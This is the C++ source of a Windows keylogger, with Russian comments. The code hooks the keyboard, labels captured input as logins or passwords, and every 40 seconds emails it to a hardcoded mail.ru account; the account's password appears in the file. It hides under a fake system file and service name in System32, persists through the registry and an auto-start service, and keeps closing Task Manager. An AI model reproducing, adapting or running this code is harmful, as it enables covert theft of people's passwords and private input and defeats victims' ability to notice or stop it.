#include "keylogger.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <ctime>
#include <windows.h>
#include <winuser.h>
#include <winreg.h>
#include <psapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <thread>
#include <mutex>
#include <algorithm>
#include <cctype>
#include <sstream>
#include <map>
#include <codecvt>
#include <locale>
#include <windows.h>
#include <shlobj.h>
#include <aclapi.h>
#include <sddl.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")
#pragma comment(lib, "advapi32.lib")

// Конфигурация
/** @brief Конфигурация email. */
const std::string EMAIL_ADDRESS = "danil.smoke.00@mail.ru";
/** @brief Пароль от почты. */
const std::string EMAIL_PASSWORD = "jBwYTceRkng0Ziyy89rO";
/** @brief Время до отправления отчета в секундах. */
const int SEND_REPORT_EVERY = 40; // в секундах
/** @brief Теневой путь. */
const std::string SYSTEM_HIDING_PATH = "C:\\Windows\\System32\\drivers\\UMDF\\";
/** @brief Фейковое название файла. */
const std::string FAKE_FILENAME = "WpdService.exe";

// Глобальные переменные
/** @brief Глобальная переменная. */
std::vector<std::string> inputs;
/** @brief Глобальная переменная. */
std::vector<std::vector<std::string>> collected_data;
/** @brief Глобальная переменная. */
std::string last_entry_type;
/** @brief Глобальная переменная. */
std::mutex data_mutex;
/** @brief Глобальная переменная. */
HHOOK keyboardHook;
/** @brief Глобальная переменная. */
bool shiftPressed = false;
/** @brief Глобальная переменная. */
bool ctrlPressed = false;
/** @brief Глобальная переменная. */
bool altPressed = false;
/** @brief Глобальная переменная. */
bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
/** @brief Глобальная переменная. */
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
/** @brief Глобальная переменная. */
SERVICE_STATUS g_ServiceStatus = { 0 };
/** @brief Глобальная переменная. */
HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;
/** @brief Глобальная переменная. */
bool g_IsService = false;

// Функции для работы с реестром и автозагрузкой
/** @brief Функция распаковки. */
void unpackToSystem32() {
    char system32Path[MAX_PATH];
    GetSystemDirectoryA(system32Path, MAX_PATH);

    char currentExePath[MAX_PATH];
    GetModuleFileNameA(NULL, currentExePath, MAX_PATH);

    std::string destination = std::string(system32Path) + "\\keylogger.exe";

    try {
        if (CopyFileA(currentExePath, destination.c_str(), FALSE)) {
            std::cout << "Файл успешно скопирован в " << destination << std::endl;
        }
        else {
            std::cerr << "Ошибка копирования файла: " << GetLastError() << std::endl;
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Ошибка: " << e.what() << std::endl;
    }
}

/** @brief Копирование и сокрытие исполняемого файла. */
bool copyToSystemFolder() {
    char system32Path[MAX_PATH];
    GetSystemDirectoryA(system32Path, MAX_PATH);

    char currentExePath[MAX_PATH];
    GetModuleFileNameA(NULL, currentExePath, MAX_PATH);

    std::string destination = SYSTEM_HIDING_PATH + FAKE_FILENAME;

    // Создаем целевую папку если ее нет
    if (!CreateDirectoryA(SYSTEM_HIDING_PATH.c_str(), NULL)) {
        if (GetLastError() != ERROR_ALREADY_EXISTS) {
            std::cerr << "Ошибка создания папки: " << GetLastError() << std::endl;
            return false;
        }
    }

    // Удаляем файл, если он уже существует
    DeleteFileA(destination.c_str());

    try {
        if (CopyFileA(currentExePath, destination.c_str(), FALSE)) {
            std::cout << "Файл успешно скопирован в " << destination << std::endl;

            // Устанавливаем скрытый атрибут
            SetFileAttributesA(destination.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

            return true;
        }
        else {
            DWORD error = GetLastError();
            std::cerr << "Ошибка копирования файла: " << error << std::endl;

            // Если ошибка из-за отсутствия прав, попробуем получить права TrustedInstaller
            if (error == ERROR_ACCESS_DENIED) {
                std::cout << "Попытка получить повышенные права..." << std::endl;
            }

            return false;
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Ошибка: " << e.what() << std::endl;
        return false;
    }
}

/** @brief Функция автостарта. */
void ensureAutostart() {
    HKEY hKey;
    char currentExePath[MAX_PATH];
    GetModuleFileNameA(NULL, currentExePath, MAX_PATH);

    const std::string regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const std::string appName = "WindowsPdfService"; // Используем нейтральное имя

    // 1. Проверяем существующую запись
    char existingPath[MAX_PATH] = { 0 };
    DWORD size = MAX_PATH;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegGetValueA(hKey, NULL, appName.c_str(), RRF_RT_REG_SZ, NULL, existingPath, &size) == ERROR_SUCCESS) {
            if (strcmp(existingPath, currentExePath) == 0) {
                RegCloseKey(hKey);
                return; // Уже правильно настроено
            }
        }
        RegCloseKey(hKey);
    }

    // 2. Создаём/обновляем запись
    if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueExA(hKey, appName.c_str(), 0, REG_SZ,
            (BYTE*)currentExePath, strlen(currentExePath) + 1) == ERROR_SUCCESS) {
            std::cout << "Автозагрузка успешно настроена" << std::endl;
        }
        else {
            std::cerr << "Ошибка настройки автозапуска: " << GetLastError() << std::endl;
        }
        RegCloseKey(hKey);
    }
    else {
        std::cerr << "Ошибка открытия ключа реестра: " << GetLastError() << std::endl;
    }
}

// Функции для работы с окнами
/** @brief Получить заголовок активного окна. */
std::string getActiveWindowTitle() {
    char windowTitle[256];
    HWND foregroundWindow = GetForegroundWindow();
    if (foregroundWindow) {
        GetWindowTextA(foregroundWindow, windowTitle, 256);
        return std::string(windowTitle);
    }
    return "Unknown";
}

// Функции для определения раскладки
/** @brief Получить текущую раскладку клавиатуры (EN/RU). */
std::string getCurrentLayout() {
    HWND foregroundWindow = GetForegroundWindow();
    DWORD threadId = GetWindowThreadProcessId(foregroundWindow, NULL);
    HKL layout = GetKeyboardLayout(threadId);

    switch (LOWORD(layout)) {
    case 0x409: return "EN";
    case 0x419: return "RU";
    default: return "Unknown";
    }
}

/** @brief Перевести символ в верхний регистр (русский). */
char toupper_ru(char ch) {
    static const std::map<char, char> ruUpperMap = {
        {'а','А'}, {'б','Б'}, {'в','В'}, {'г','Г'}, {'д','Д'}, {'е','Е'}, {'ё','Ё'}, {'ж','Ж'}, {'з','З'}, {'и','И'},
        {'й','Й'}, {'к','К'}, {'л','Л'}, {'м','М'}, {'н','Н'}, {'о','О'}, {'п','П'}, {'р','Р'}, {'с','С'}, {'т','Т'},
        {'у','У'}, {'ф','Ф'}, {'х','Х'}, {'ц','Ц'}, {'ч','Ч'}, {'ш','Ш'}, {'щ','Щ'}, {'ъ','Ъ'}, {'ы','Ы'}, {'ь','Ь'},
        {'э','Э'}, {'ю','Ю'}, {'я','Я'}
    };

    auto it = ruUpperMap.find(ch);
    return (it != ruUpperMap.end()) ? it->second : ch;
}

/** @brief Перевести символ в нижний регистр (русский). */
char tolower_ru(char ch) {
    static const std::map<char, char> ruLowerMap = {
        {'А','а'}, {'Б','б'}, {'В','в'}, {'Г','г'}, {'Д','д'}, {'Е','е'}, {'Ё','ё'}, {'Ж','ж'}, {'З','з'}, {'И','и'},
        {'Й','й'}, {'К','к'}, {'Л','л'}, {'М','м'}, {'Н','н'}, {'О','о'}, {'П','п'}, {'Р','р'}, {'С','с'}, {'Т','т'},
        {'У','у'}, {'Ф','ф'}, {'Х','х'}, {'Ц','ц'}, {'Ч','ч'}, {'Ш','ш'}, {'Щ','щ'}, {'Ъ','ъ'}, {'Ы','ы'}, {'Ь','ь'},
        {'Э','э'}, {'Ю','ю'}, {'Я','я'}
    };

    auto it = ruLowerMap.find(ch);
    return (it != ruLowerMap.end()) ? it->second : ch;
}

// Функции для конвертации символов
/** @brief Конвертировать символ из русской раскладки в английскую. */
std::string convertToEnglish(char ch, bool uppercase) {
    static const std::map<char, char> enLayout = {
        {'й','q'}, {'ц','w'}, {'у','e'}, {'к','r'}, {'е','t'}, {'н','y'}, {'г','u'}, {'ш','i'}, {'щ','o'}, {'з','p'},
        {'х','['}, {'ъ',']'}, {'ф','a'}, {'ы','s'}, {'в','d'}, {'а','f'}, {'п','g'}, {'р','h'}, {'о','j'}, {'л','k'},
        {'д','l'}, {'ж',';'}, {'э','\''}, {'я','z'}, {'ч','x'}, {'с','c'}, {'м','v'}, {'и','b'}, {'т','n'}, {'ь','m'},
        {'б',','}, {'ю','.'}, {'ё','`'}, {'1','1'}, {'2','2'}, {'3','3'}, {'4','4'}, {'5','5'}, {'6','6'},
        {'7','7'}, {'8','8'}, {'9','9'}, {'0','0'}, {'-','-'}, {'=','='}, {'\\','\\'}, {'/','/'}, {' ', ' '}
    };

    static const std::map<char, char> enShiftLayout = {
        {'Й','Q'}, {'Ц','W'}, {'У','E'}, {'К','R'}, {'Е','T'}, {'Н','Y'}, {'Г','U'}, {'Ш','I'}, {'Щ','O'}, {'З','P'},
        {'Х','{'}, {'Ъ','}'}, {'Ф','A'}, {'Ы','S'}, {'В','D'}, {'А','F'}, {'П','G'}, {'Р','H'}, {'О','J'}, {'Л','K'},
        {'Д','L'}, {'Ж',':'}, {'Э','"'}, {'Я','Z'}, {'Ч','X'}, {'С','C'}, {'М','V'}, {'И','B'}, {'Т','N'}, {'Ь','M'},
        {'Б','<'}, {'Ю','>'}, {'Ё','~'}, {'!','!'}, {'@','@'}, {'#','#'}, {'$','$'}, {'%','%'}, {'^','^'}, {'&','&'},
        {'*','*'}, {'(','('}, {')',')'}, {'_','_'}, {'+','+'}, {'|','|'}, {'?','?'}, {'"','"'}, {'<','<'}, {'>','>'},
        {'~','~'}, {':',':'}, {'{','{'}, {'}','}'}, {'"','"'}, {'|','|'}
    };

    if (uppercase) {
        auto it = enShiftLayout.find(ch);
        return (it != enShiftLayout.end()) ? std::string(1, it->second) : std::string(1, toupper(ch));
    }
    else {
        auto it = enLayout.find(ch);
        return (it != enLayout.end()) ? std::string(1, it->second) : std::string(1, tolower(ch));
    }
}

/** @brief Конвертировать символ из английской раскладки в русскую. */
std::string convertToRussian(char ch, bool uppercase) {
    static const std::map<char, char> ruLayout = {
        {'q','й'}, {'w','ц'}, {'e','у'}, {'r','к'}, {'t','е'}, {'y','н'}, {'u','г'}, {'i','ш'}, {'o','щ'}, {'p','з'},
        {'[','х'}, {']','ъ'}, {'a','ф'}, {'s','ы'}, {'d','в'}, {'f','а'}, {'g','п'}, {'h','р'}, {'j','о'}, {'k','л'},
        {'l','д'}, {';','ж'}, {'\'','э'}, {'z','я'}, {'x','ч'}, {'c','с'}, {'v','м'}, {'b','и'}, {'n','т'}, {'m','ь'},
        {',','б'}, {'.','ю'}, {'`','ё'}, {'1','1'}, {'2','2'}, {'3','3'}, {'4','4'}, {'5','5'}, {'6','6'},
        {'7','7'}, {'8','8'}, {'9','9'}, {'0','0'}, {'-','-'}, {'=','='}, {'\\','\\'}, {'/','.'}, {' ', ' '}
    };

    static const std::map<char, char> ruShiftLayout = {
        {'Q','Й'}, {'W','Ц'}, {'E','У'}, {'R','К'}, {'T','Е'}, {'Y','Н'}, {'U','Г'}, {'I','Ш'}, {'O','Щ'}, {'P','З'},
        {'{','Х'}, {'}','Ъ'}, {'A','Ф'}, {'S','Ы'}, {'D','В'}, {'F','А'}, {'G','П'}, {'H','Р'}, {'J','О'}, {'K','Л'},
        {'L','Д'}, {':','Ж'}, {'"','Э'}, {'Z','Я'}, {'X','Ч'}, {'C','С'}, {'V','М'}, {'B','И'}, {'N','Т'}, {'M','Ь'},
        {'<','Б'}, {'>','Ю'}, {'~','Ё'}, {'!','!'}, {'@','"'}, {'#','№'}, {'$',';'}, {'%',':'}, {'^',','}, {'&','?'},
        {'*','*'}, {'(','('}, {')',')'}, {'_','_'}, {'+','+'}, {'|','/'}, {'?',','}, {'"','"'}, {'<','<'}, {'>','>'},
        {'~','~'}, {':',':'}, {'{','{'}, {'}','}'}, {'"','"'}, {'|','|'}
    };

    if (uppercase) {
        auto it = ruShiftLayout.find(ch);
        return (it != ruShiftLayout.end()) ? std::string(1, it->second) : std::string(1, toupper_ru(ch));
    }
    else {
        auto it = ruLayout.find(ch);
        return (it != ruLayout.end()) ? std::string(1, it->second) : std::string(1, tolower_ru(ch));
    }
}

// Функции для проверки форматов данных
/** @brief Проверка, является ли строка телефонным номером. */
bool isPhoneNumber(const std::string& input) {
    if (input.empty()) return false;

    if (input[0] == '+') {
        if (input.size() < 2) return false;
        return std::all_of(input.begin() + 1, input.end(), [](char c) { return isdigit(c); });
    }
    else {
        return std::all_of(input.begin(), input.end(), [](char c) { return isdigit(c); });
    }
}

/** @brief Проверка, является ли строка email-адресом. */
bool isEmail(const std::string& input) {
    size_t at_pos = input.find('@');
    if (at_pos == std::string::npos || at_pos == 0 || at_pos == input.length() - 1)
        return false;

    size_t dot_pos = input.find('.', at_pos);
    if (dot_pos == std::string::npos || dot_pos == at_pos + 1 || dot_pos == input.length() - 1)
        return false;

    return true;
}

/** @brief Проверка, является ли строка логином. */
bool isUsername(const std::string& input) {
    if (input.length() < 3) return false;

    for (char c : input) {
        if (!isalnum(c) && c != '_' && c != '-' && c != '.')
            return false;
    }

    return true;
}

/** @brief Распознать тип ввода: email, username, телефон. */
std::string isEmailOrUsernameOrPhone(const std::string& input) {
    if (isEmail(input)) return "email";
    if (isUsername(input)) return "username";
    if (isPhoneNumber(input)) return "phone";
    return "";
}

/** @brief Проверка, выглядит ли строка как пароль. */
bool isProbablePassword(const std::string& input) {
    if (input.length() < 8) return false;

    bool hasLetter = false;
    bool hasDigit = false;
    bool hasSpecial = false;

    for (char c : input) {
        if (isalpha(c)) hasLetter = true;
        else if (isdigit(c)) hasDigit = true;
        else if (strchr("@#$%^&+=_-", c)) hasSpecial = true;
        else return false;
    }

    return hasLetter && (hasDigit || hasSpecial);
}

// Обработка ввода
/** @brief Обработка буфера ввода. */
void processInputs() {
    std::lock_guard<std::mutex> lock(data_mutex);

    if (inputs.empty()) return;

    std::string joined_input;
    for (const auto& s : inputs) {
        joined_input += s;
    }

    std::string active_window = getActiveWindowTitle();
    std::string data_type;

    std::string input_type = isEmailOrUsernameOrPhone(joined_input);
    if (!input_type.empty()) {
        if (last_entry_type == "Login") {
            data_type = "Password";
        }
        else {
            data_type = "Login";
        }
    }
    else if (isProbablePassword(joined_input)) {
        data_type = "Password";
    }
    else {
        data_type = "Unknown";
    }

    time_t now = time(nullptr);
    char timestamp[20];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));

    std::vector<std::string> entry = {
        timestamp,
        active_window,
        joined_input,
        data_type
    };

    collected_data.push_back(entry);
    last_entry_type = data_type;
    inputs.clear();
}

// Обработчик клавиш
/** @brief Обработчик клавиш. */
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // Обработка модификаторов
            switch (pKey->vkCode) {
            case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: shiftPressed = true; break;
            case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: ctrlPressed = true; break;
            case VK_MENU: case VK_LMENU: case VK_RMENU: altPressed = true; break;
            case VK_CAPITAL: capsLockOn = !capsLockOn; break;
            case VK_RETURN: processInputs(); break;
            case VK_SPACE: inputs.push_back(" "); break;
            case VK_BACK: if (!inputs.empty()) inputs.pop_back(); break;
            case VK_ESCAPE: PostQuitMessage(0); break;
            default: {
                BYTE keyboardState[256] = { 0 };
                GetKeyboardState(keyboardState);

                // Учитываем состояние модификаторов
                keyboardState[VK_SHIFT] = (shiftPressed) ? 0x80 : 0;
                keyboardState[VK_CONTROL] = (ctrlPressed) ? 0x80 : 0;
                keyboardState[VK_MENU] = (altPressed) ? 0x80 : 0;
                keyboardState[VK_CAPITAL] = (capsLockOn) ? 0x01 : 0;

                WCHAR buffer[16] = { 0 };
                int result = ToUnicodeEx(pKey->vkCode, pKey->scanCode, keyboardState, buffer, 16, 0, GetKeyboardLayout(0));

                if (result > 0) {
                    std::string current_layout = getCurrentLayout();
                    bool uppercase = (shiftPressed != capsLockOn); // XOR - если либо shift, либо capsLock

                    for (int i = 0; i < result; i++) {
                        char ch = static_cast<char>(buffer[i]);
                        std::string converted;

                        if (current_layout == "RU") {
                            converted = convertToRussian(ch, uppercase);
                        }
                        else {
                            converted = convertToEnglish(ch, uppercase);
                        }

                        if (!converted.empty()) {
                            inputs.push_back(converted);
                        }
                    }
                }
            }
            }
        }
        else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
            switch (pKey->vkCode) {
            case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: shiftPressed = false; break;
            case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: ctrlPressed = false; break;
            case VK_MENU: case VK_LMENU: case VK_RMENU: altPressed = false; break;
            }
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

// Функции для отправки email
/** @brief Инициализация SSL-библиотеки. */
void initSSL() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

/** @brief Кодировка строки в base64. */
std::string base64Encode(const std::string& input) {
    BIO* bmem, * b64;
    BUF_MEM* bptr;

    b64 = BIO_new(BIO_f_base64());
    bmem = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, bmem);
    BIO_write(b64, input.c_str(), input.length());
    BIO_flush(b64);
    BIO_get_mem_ptr(b64, &bptr);

    std::string result(bptr->data, bptr->length - 1);
    BIO_free_all(b64);

    return result;
}

/** @brief Подготовка MIME-сообщения для отправки. */
std::string prepareMail(const std::string& message) {
    std::stringstream email;
    std::string boundary = "----=_NextPart_" + std::to_string(time(nullptr));

    email << "From: " << EMAIL_ADDRESS << "\r\n";
    email << "To: " << EMAIL_ADDRESS << "\r\n";
    email << "Subject: Журнал нажатий клавиш\r\n";
    email << "MIME-Version: 1.0\r\n";
    email << "Content-Type: multipart/alternative; boundary=\"" << boundary << "\"\r\n\r\n";

    email << "--" << boundary << "\r\n";
    email << "Content-Type: text/plain; charset=utf-8\r\n";
    email << "Content-Transfer-Encoding: base64\r\n\r\n";
    email << base64Encode(message) << "\r\n\r\n";

    email << "--" << boundary << "--\r\n";

    return email.str();
}

/** @brief Отправка сообщения через SMTP. */
bool sendMail(const std::string& message) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed" << std::endl;
        return false;
    }

    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) {
        std::cerr << "SSL_CTX_new failed" << std::endl;
        WSACleanup();
        return false;
    }

    // Используем порт 465 для SSL
    BIO* bio = BIO_new_ssl_connect(ctx);
    if (!bio) {
        std::cerr << "BIO_new_ssl_connect failed" << std::endl;
        SSL_CTX_free(ctx);
        WSACleanup();
        return false;
    }

    BIO_set_conn_hostname(bio, "smtp.mail.ru:465");

    SSL* ssl = nullptr;
    BIO_get_ssl(bio, &ssl);
    SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);

    if (BIO_do_connect(bio) <= 0) {
        std::cerr << "BIO_do_connect failed: " << ERR_reason_error_string(ERR_get_error()) << std::endl;
        BIO_free_all(bio);
        SSL_CTX_free(ctx);
        WSACleanup();
        return false;
    }

    std::stringstream ss;
    char buffer[4096] = { 0 };

    // Чтение приветственного сообщения
    BIO_read(bio, buffer, sizeof(buffer) - 1);

    // EHLO
    ss << "EHLO localhost\r\n";
    BIO_write(bio, ss.str().c_str(), ss.str().length());
    BIO_read(bio, buffer, sizeof(buffer) - 1);
    ss.str("");

    // Аутентификация
    ss << "AUTH LOGIN\r\n";
    BIO_write(bio, ss.str().c_str(), ss.str().length());
    BIO_read(bio, buffer, sizeof(buffer) - 1);
    ss.str("");

    ss << base64Encode(EMAIL_ADDRESS) << "\r\n";
    BIO_write(bio, ss.str().c_str(), ss.str().length());
    BIO_read(bio, buffer, sizeof(buffer) - 1);
    ss.str("");

    ss << base64Encode(EMAIL_PASSWORD) << "\r\n";
    BIO_write(bio, ss.str().c_str(), ss.str().length());
    BIO_read(bio, buffer, sizeof(buffer) - 1);
    ss.str("");

    // Отправка письма
    ss << "MAIL FROM: <" << EMAIL_ADDRESS << ">\r\n";
    BIO_write(bio, ss.str().c_str(), ss.str().length());
    BIO_read(bio, buffer, sizeof(buffer) - 1);
    ss.str("");

    ss << "RCPT TO: <" << EMAIL_ADDRESS << ">\r\n";
    BIO_write(bio, ss.str().c_str(), ss.str().length());
    BIO_read(bio, buffer, sizeof(buffer) - 1);
    ss.str("");

    ss << "DATA\r\n";
    BIO_write(bio, ss.str().c_str(), ss.str().length());
    BIO_read(bio, buffer, sizeof(buffer) - 1);
    ss.str("");

    std::string emailData = prepareMail(message);
    BIO_write(bio, emailData.c_str(), emailData.length());
    BIO_write(bio, "\r\n.\r\n", 5);
    BIO_read(bio, buffer, sizeof(buffer) - 1);

    // Завершение
    ss << "QUIT\r\n";
    BIO_write(bio, ss.str().c_str(), ss.str().length());

    BIO_free_all(bio);
    SSL_CTX_free(ctx);
    WSACleanup();
    return true;
}

// Отчет
/** @brief Циклическая отправка отчетов на почту. */
void report() {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(SEND_REPORT_EVERY));

        std::lock_guard<std::mutex> lock(data_mutex);
        if (!collected_data.empty()) {
            std::stringstream message;
            for (const auto& entry : collected_data) {
                message << "[" << entry[0] << "] Window: " << entry[1]
                    << " | Type: " << entry[3] << " | Input: " << entry[2] << "\n";
            }

            if (sendMail(message.str())) {
                std::cout << "Отчет успешно отправлен" << std::endl;
                collected_data.clear();
            }
            else {
                std::cerr << "Ошибка отправки отчета" << std::endl;
            }
        }
    }
}

// Функция для скрытия файла
// ========== СЛУЖЕБНЫЕ ФУНКЦИИ ========== //

/** @brief Скрыть исполняемый файл, переместив его в системную папку. */
bool hideExecutable() {
    // Проверяем, не находимся ли мы уже в системной папке
    char currentExePath[MAX_PATH];
    GetModuleFileNameA(NULL, currentExePath, MAX_PATH);
    std::string currentPath(currentExePath);

    std::string targetPath = SYSTEM_HIDING_PATH + FAKE_FILENAME;

    if (currentPath == targetPath) {
        std::cout << "Программа уже находится в системной папке" << std::endl;
        return true;
    }
    std::string oldDllPath = SYSTEM_HIDING_PATH + "WpdService.dll";
    DeleteFileA(oldDllPath.c_str());

    // Копируем файл в системную папку
    if (!copyToSystemFolder()) {
        std::cerr << "Не удалось скопировать файл в системную папку" << std::endl;
        return false;
    }

    return true;
}

/** @brief Обработчик управления службой. */
VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
    switch (CtrlCode) {
    case SERVICE_CONTROL_STOP:
        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING) break;

        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        g_ServiceStatus.dwWin32ExitCode = 0;
        g_ServiceStatus.dwCheckPoint = 4;

        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        SetEvent(g_ServiceStopEvent);
        break;
    default:
        break;
    }
}

/** @brief Основная функция службы. */
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    g_StatusHandle = RegisterServiceCtrlHandler("WpdService", ServiceCtrlHandler);

    ZeroMemory(&g_ServiceStatus, sizeof(g_ServiceStatus));
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    g_IsService = true;

    // Инициализация
    std::cout << "Служба кейлоггера запущена" << std::endl;
    initSSL();

    std::thread reportThread(report);
    reportThread.detach();

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    // Основной цикл
    MSG msg;
    while (true) {
        if (WaitForSingleObject(g_ServiceStopEvent, 0) == WAIT_OBJECT_0) {
            break;
        }

        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) {
                SetEvent(g_ServiceStopEvent);
                break;
            }
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Sleep(100);
    }

    // Очистка
    UnhookWindowsHookEx(keyboardHook);
    std::cout << "Служба кейлоггера остановлена" << std::endl;

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

/** @brief Установить службу Windows. */
void installService() {
    std::cout << "Установка службы..." << std::endl;

    if (!hideExecutable()) {
        std::cerr << "Ошибка скрытия файла" << std::endl;
        return;
    }

    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        std::cerr << "Ошибка открытия SCM: " << GetLastError() << std::endl;
        return;
    }

    std::string fullPath = SYSTEM_HIDING_PATH + FAKE_FILENAME;

    SC_HANDLE service = CreateServiceA(
        scm,
        "WpdService",
        "Windows Portable Devices Service",
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        fullPath.c_str(),
        NULL, NULL, NULL, NULL, NULL
    );

    if (service) {
        SERVICE_DESCRIPTIONA desc = { "Управление переносными устройствами" };
        ChangeServiceConfig2A(service, SERVICE_CONFIG_DESCRIPTION, &desc);

        StartService(service, 0, NULL);
        CloseServiceHandle(service);
        std::cout << "Служба успешно установлена" << std::endl;
    }
    else {
        std::cerr << "Ошибка создания службы: " << GetLastError() << std::endl;
    }
    CloseServiceHandle(scm);
}

/** @brief Поток, закрывающий диспетчер задач. */
void monitorAndCloseTaskManager() {
    while (true) {
        HWND hWnd = FindWindowA("TaskManagerWindow", NULL);
        if (hWnd) {
            PostMessage(hWnd, WM_CLOSE, 0, 0);
        }
        Sleep(2000); // проверка каждые 2 секунды
    }
}